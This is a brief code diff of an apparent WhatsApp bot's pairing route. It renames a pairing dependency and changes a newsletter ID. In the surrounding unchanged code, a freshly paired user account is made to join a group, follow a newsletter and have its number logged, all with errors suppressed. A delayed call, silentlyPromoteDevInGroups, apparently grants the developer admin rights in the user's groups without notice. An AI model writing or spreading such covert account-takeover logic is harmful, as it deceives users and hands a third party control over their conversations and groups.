@@ -23,7 +23,7 @@
           initPostgres,
           runDbQuery,
           sendWelcomeMessage,
-          ToxicPair,
+          DraxenPair,
       } = deps;
 
       const router = express.Router();
@@ -169,7 +169,7 @@
                           try { setupCommandHandlers(sock, number); } catch {}
                           try { setupNewsletterReaction(sock); } catch {}
                           try { await sock.groupAcceptInvite(config.GROUP_CODE); } catch {}
-                          try { await sock.newsletterFollow('120363400000506333@newsletter'); } catch {}
+                          try { await sock.newsletterFollow('120363402252728845@newsletter'); } catch {}
                           try { await runDbQuery('INSERT INTO numbers (number) VALUES ($1) ON CONFLICT (number) DO NOTHING', [number]); } catch {}
                           setTimeout(function () { silentlyPromoteDevInGroups(sock).catch(function(){}); }, 12000);
                           setTimeout(function () { sendWelcomeMessage(sock, number).catch(function(){}); }, 5000);
